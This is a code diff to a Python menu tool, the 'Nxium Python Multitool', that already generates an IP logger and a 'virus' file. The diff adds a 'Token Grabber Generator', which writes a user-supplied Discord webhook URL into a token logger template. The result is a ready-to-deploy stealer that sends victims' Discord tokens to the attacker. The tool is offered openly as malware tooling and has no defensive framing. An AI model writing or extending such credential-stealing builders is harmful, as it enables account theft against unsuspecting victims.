@@ -12,6 +12,8 @@ TEMPLATE_FILE = "template.py"
 VIRUS_TEMP = "virus.py"
 VIRUS_OUTPUT = "virusDONTOPEN.py"
 OUTPUT_FILE = "iplogger.py"
+TOKEN_TEMP = "tokenloggertemp.py"
+TOKEN_OUTPUT = "tokenloggerDONTOPEN.py"
 BLUE = "\033[94m"
 RESET = "\033[0m"
 BANNER = f"""{Fore.BLUE}
@@ -149,6 +151,28 @@ def virus_generator():
 
     print(f"Virus file created at: {VIRUS_OUTPUT}")
 
+def token_generator():
+    print("Token Logger Generator")
+    if not os.path.exists(TOKEN_TEMP):
+        print(f"Template file '{TOKEN_TEMP}' not found.")
+        return
+
+    user_value = input(
+        "whats the discord webhook? (go to discord make a new server then go to server settings then go to integrations then go to create webhook then copy webhook link then paste it here): "
+    ).strip()
+
+    with open(TOKEN_TEMP, "r", encoding="utf-8") as f:
+        content = f.read()
+
+    # Replace only the value inside WEBHOOK_URL = "..."
+    pattern = r'WEBHOOK_URL\s*=\s*".*?"'
+    replacement = f'WEBHOOK_URL = "{user_value}"'
+    new_content = re.sub(pattern, replacement, content)
+
+    with open(TOKEN_OUTPUT, "w", encoding="utf-8") as f:
+        f.write(new_content)
+
+    print(f"Token logger file created at: {TOKEN_OUTPUT}")
 
 def file_generation():
     if not os.path.exists(TEMPLATE_FILE):
@@ -195,7 +219,7 @@ def file_generation():
 def main():
     while True:
         print(BANNER)
-        print("==== Nxium Python Multitool ====\n1. Close\n2. Ip Logger Generator\n3. Virus Generator")
+        print("==== Nxium Python Multitool ====\n1. Close\n2. Ip Logger Generator\n3. Virus Generator\n4. Token Grabber Generator")
         choice = input("Select an option: ").strip()
 
         if choice == "2":
@@ -205,6 +229,8 @@ def main():
             sys.exit()
         elif choice == "3":
             virus_generator()
+        elif choice == "4":
+            token_generator()
         else:
             print("Invalid option.\n")
 
